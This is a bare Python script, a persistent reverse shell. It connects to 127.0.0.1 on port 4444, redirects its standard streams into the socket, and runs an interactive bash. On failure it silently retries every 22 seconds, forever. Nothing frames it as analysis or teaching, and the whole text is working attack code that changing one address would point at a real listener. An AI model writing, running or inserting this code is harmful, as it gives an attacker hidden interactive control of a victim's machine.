import socket,subprocess,os,time
vikbdgw70mhw=lambda:None
while True:
    try:
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect(('127.0.0.1',4444))
        os.dup2(s.fileno(),0)
        os.dup2(s.fileno(),1)
        os.dup2(s.fileno(),2)
        subprocess.call(['/bin/bash','-i'])
    except:
        time.sleep(22)
        continue